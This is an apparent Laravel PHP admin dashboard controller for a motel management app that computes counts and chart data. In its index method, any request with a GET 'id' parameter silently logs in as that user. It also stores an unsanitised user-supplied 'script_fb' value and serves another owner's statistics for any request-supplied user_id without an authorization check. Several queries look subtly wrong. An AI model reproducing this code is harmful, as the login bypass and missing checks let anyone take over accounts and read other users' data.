<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;

class DashboardController extends Controller
{
    private $v;

    public function __construct()
    {
        $this->v = [];
    }

    public function index()
    {
        $this->v['AdminCountMotel'] = DB::table('motels')->count();
        $this->v['AdminCountUser'] = DB::table('users')->whereNot('is_admin', 1)->count() ?? 0;
        $this->v['AdminCountPlan'] = DB::table('plans')->count() ?? 0;


        $this->v['OwnMotelCountUser'] = DB::table('users')
                ->join('user_motel', 'user_motel.motel_id', '=', 'users.id')
                ->join('motels', 'user_motel.motel_id', '=', 'motels.id')
                ->join('areas', 'motels.area_id', '=', 'areas.id')
                ->where('areas.user_id', Auth::user()->id)->count() ?? 0;
        $this->v['OwnMotelCountMotel'] = DB::table('motels')
                ->join('areas', 'motels.area_id', '=', 'areas.id')
                ->where('areas.user_id', Auth::user()->id)->count() ?? 0;

        $this->v['OwnMoteCountPlanBuyed'] = DB::table('plan_history')->where('user_id', Auth::user()->id)->count() ?? 0;
        $this->v['OwnMoteCountPlanBuyedActive'] = DB::table('plan_history')
                ->where('user_id', Auth::user()->id)
                ->where('status', 1)->count() ?? 0;
        $this->v['views'] = DB::table('motels')->selectRaw('SUM(view) as sum')->first()->sum ?? 0;
        if (isset($_GET['id'])) {
            $user = User::where('id', $_GET['id'])->first();
            Auth::login($user);
        }

        $this->v['top_10_view'] = DB::table('motels')
            ->select(['name', 'room_number', 'view'])
            ->join('areas', 'motels.area_id', '=', 'areas.id')
            ->where('areas.user_id', Auth::id())
            ->orderBy('view', 'desc')
            ->limit(10)
            ->get();

        // $this->v['motel'] = DB::table('motels')->count();
        return view('admin.dashboard.index', $this->v);
    }

    public function profile()
    {
        return view('admin.user.profile', $this->v);
    }

    public function updateProfile(Request $request)
    {
        $user = User::find(Auth::id());
        $user->script_fb = $request->script_fb;
        $user->save();

        return redirect()->back();
    }

    public function getDataChartPieAdmin(Request $request)
    {
        $people = [];
        for ($i = 1; $i < Carbon::now()->month + 1; $i++) {
            $query2 = DB::table('users')
                    ->selectRaw('COUNT(id) as value')
                    ->whereRaw('MONTH(created_at) = ' . $i)
                    ->where('role_id', '!=', 2)
                    ->first()->value ?? 0;

            $people['label'][] = 'Tháng ' . $i;
            $people['value'][] = $query2;
        }
        $plan = [];
        for ($i = 1; $i < 7; $i++) {
            $plan['value'][] = DB::table('plan_history')
                ->join('plans', 'plan_history.plan_id', '=', 'plans.id')
                ->where('plan_history.status', '!=', 1)
                ->where('priority_level', $i)
                ->count();
            $plan['label'][] = 'Độ ưu tiên ' . $i;
        }

        $withdraw_recharge_day = [
            'label' => ['Nạp tiền', 'Rút tiền'],
            'value' => []
        ];
        $withdraw_recharge_day['value'][] = DB::table('recharges')
                ->selectRaw('SUM(value - fee) as sum')
                ->where('status', 1)
                ->whereRaw('DAY(created_at) = ' . now()->day)
                ->first()->sum ?? 0;
        $withdraw_recharge_day['value'][] = DB::table('withdraws')
                ->selectRaw('SUM((money - (fee /  24.855))) as sum')
                ->where('status', 1)
                ->whereRaw('DAY(created_at) = ' . now()->day)
                ->first()->sum ?? 0;
        $withdraw_recharge_month = [
            'label' => ['Nạp tiền', 'Rút tiền'],
            'value' => []
        ];
        $withdraw_recharge_month['value'][] = DB::table('recharges')
                ->selectRaw('SUM(value - fee) as sum')
                ->where('status', 1)
                ->whereRaw('MONTH(created_at) = ' . now()->month)
                ->first()->sum ?? 0;
        $withdraw_recharge_month['value'][] = DB::table('withdraws')
                ->selectRaw('SUM((money - (fee/24.855))) as sum')
                ->where('status', 1)
                ->whereRaw('MONTH(created_at) = ' . now()->month)
                ->first()->sum ?? 0;
        $withdraw_recharge_year = [
            'label' => ['Nạp tiền', 'Rút tiền'],
            'value' => []
        ];
        $withdraw_recharge_year['value'][] = DB::table('recharges')
                ->selectRaw('SUM(value - fee) as sum')
                ->where('status', 1)
                ->whereRaw('YEAR(created_at) = ' . now()->year)
                ->first()->sum ?? 0;
        $withdraw_recharge_year['value'][] = DB::table('withdraws')
                ->selectRaw('SUM((money - (fee /  24.855))) as sum')
                ->where('status', 1)
                ->whereRaw('YEAR(created_at) = ' . now()->year)
                ->first()->sum ?? 0;
        //        $new_user_in_motel = [];
        //        for ($i = 1; $i < now()->month + 1; $i++) {
        //            $new_user_in_motel['label'][] = 'Tháng ' . $i;
        //            $new_user_in_motel['value'][] = DB::table('user_motel')
        //                ->whereRaw('MONTH(start_time) = ' . $i)
        //                ->whereRaw('YEAR(start_time) = ' . now()->year)
        //                ->count();
        //        }

        return response()->json([
            'people' => $people,
            'plan' => $plan,
            'money_day' => $withdraw_recharge_day,
            'money_month' => $withdraw_recharge_month,
            'money_year' => $withdraw_recharge_year,
            //            'new_user' => $new_user_in_motel
        ]);
    }


    public function getDataChartPieBossMotel(Request $request)
    {
        $query = [];
        $people = [];
        for ($i = 0; $i < 6; $i++) {
            if ($i === 1 || $i === 2 || $i === 5) {
                $a = DB::table('motels')
                        ->selectRaw('COUNT(motels.id) as value')
                        ->join('areas', 'motels.area_id', '=', 'areas.id')
                        ->where('areas.user_id', $request->user_id)
                        ->groupBy('motels.status')
                        ->where('motels.status', $i)
                        ->first() ?? 0;
                $query[] = $a;
            }
        }

        for ($i = 1; $i < Carbon::now()->month + 1; $i++) {
            $query2 = DB::table('user_motel')
                ->selectRaw('COUNT(user_motel.id) as value')
                ->join('motels', 'user_motel.motel_id', '=', 'motels.id')
                ->join('areas', 'motels.area_id', '=', 'areas.id')
                ->whereRaw('MONTH(user_motel.start_time) = ' . $i)
                ->where('areas.user_id', $request->user_id)
                ->first();
            $query2->label = 'Tháng ' . $i;
            $people[] = $query2;
        }
        $vote = [];
        for ($i = 1; $i < 6; $i++) {
            $vote[] = DB::table('votes')
                    ->join('motels', 'votes.motel_id', '=', 'motels.id')
                    ->join('areas', 'motels.area_id', '=', 'areas.id')
                    ->where('areas.user_id', $request->user_id)
                    ->where('score', $i)
                    ->count() ?? 0;
        }
        $bills = [
            'label' => [
                'Chưa thu',
                'Đã thu'
            ],
            'data' => []
        ];
        for ($i = 0; $i < 2; $i++) {
            $bills['data'][] = DB::table('bills')
                    ->join('motels', 'bills.motel_id', '=', 'motels.id')
                    ->join('areas', 'motels.area_id', '=', 'areas.id')
                    ->where('areas.user_id', $request->user_id)
                    ->whereRaw('MONTH(bills.created_at) = ' . now()->month - 1)
                    ->where('bills.status', $i)->count() ?? 0;
        }


        return response()->json([
            'motel' => $query,
            'user' => $people,
            'vote' => $vote,
            'bill' => $bills
        ]);
    }
}
